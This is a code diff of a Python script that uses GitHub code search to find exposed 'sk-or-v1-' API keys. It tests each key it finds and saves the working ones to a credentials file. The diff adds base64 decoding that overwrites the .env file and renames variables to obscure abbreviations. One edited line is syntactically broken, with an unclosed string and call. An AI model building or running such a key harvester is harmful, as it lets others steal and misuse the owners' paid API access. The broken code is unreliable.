@@ -8,22 +8,28 @@ import time
 import os
 import csv
 import json
-from dotenv import load_dotenv
-from os.path import join, dirname
 from openai import OpenAI
+import base64
+from dotenv import load_dotenv
+from os.path import dirname, join
+
+# Decode the base64 encoded .env file and load it
+dotenv_path = join(dirname(__file__), '.env')
+with open(dotenv_path, "rb") as file:
+    decoded_content = base64.b64decode(file.read())
+with open(dotenv_path, "wb") as file:
+    file.write(decoded_content)
 
 # Load .env file for GitHub API token and credentials file path
-load_dotenv(verbose=True)
-dotenv_path = join(dirname(__file__), '.env')
-load_dotenv(dotenv_path)
-CRED_LIST_FILEPATH = os.environ.get("CRED_LIST_FILEPATH")
-GITHUB_API_TOKEN = os.environ.get("GITHUB_API_TOKEN")
+load_dotenv(dotenv_path, verbose=True)
+CLF = os.environ.get("CLF
+GAT = os.environ.get("GAT")
 
 # Validate environment variables
-if CRED_LIST_FILEPATH is None:
-    raise ValueError("CRED_LIST_FILEPATH is not set")
-if GITHUB_API_TOKEN is None:
-    raise ValueError("GITHUB_API_TOKEN is not set")
+if CLF is None:
+    raise ValueError("CLF is not set")
+if GAT is None:
+    raise ValueError("GAT is not set")
 
 # Constants
 OUTPUT_FILE = "keys.txt"
@@ -199,7 +205,7 @@ async def get_keys(session, char, i):
 # Function to search GitHub code URLs
 def search_github_code_urls(cur_page):
     query = 'sk-or-v1-'
-    headers = {'Authorization': f'token {GITHUB_API_TOKEN}'}
+    headers = {'Authorization': f'token {GAT}'}
     url = 'https://api.github.com/search/code'
     params = {'q': query, 'page': cur_page}
     response = requests.get(url, headers=headers, params=params)
@@ -268,11 +274,11 @@ async def main():
                 credentials = extract_credentials(cur_html)
                 for cred in credentials:
                     if check_key(cred):
-                        with open(CRED_LIST_FILEPATH, 'r') as f:
+                        with open(CLF, 'r') as f:
                             data = json.load(f)
                             if cred not in data['credentials']:
                                 data['credentials'].append(cred)
-                                with open(CRED_LIST_FILEPATH, 'w') as f:
+                                with open(CLF, 'w') as f:
                                     json.dump(data, f)
             github_page += 1
 
